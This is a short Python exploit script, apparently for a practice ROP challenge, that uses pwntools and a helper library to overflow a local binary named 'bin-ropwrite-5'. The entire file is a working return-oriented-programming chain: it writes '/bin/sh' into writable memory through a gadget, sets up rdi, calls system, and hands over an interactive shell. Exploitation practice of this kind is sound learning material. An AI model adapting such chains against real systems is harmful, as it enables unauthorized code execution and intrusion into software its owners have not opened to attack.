import Fart_ROP
from pwn import *
from analyze import *

binary = './bins2/bin-ropwrite-5'

anal = Analyze(binary)
rop = Fart_ROP.ROP(anal)

writeable_mem = anal.elf.sym['__data_start']

chain = b'A' * rop.offset
chain += rop.fill_reg('r8', writeable_mem)
chain += rop.fill_reg('rax', '/bin/sh\0')

chain += p64(0x0000000000400779) # mov qword ptr [r8], rax; pop r15; ret;
chain += p64(0) # r15

chain += rop.fill_reg('rdi', writeable_mem)
chain += rop.realign()
chain += p64(anal.elf.sym['system'])

io = process(binary)
io.sendline(chain)
io.interactive()
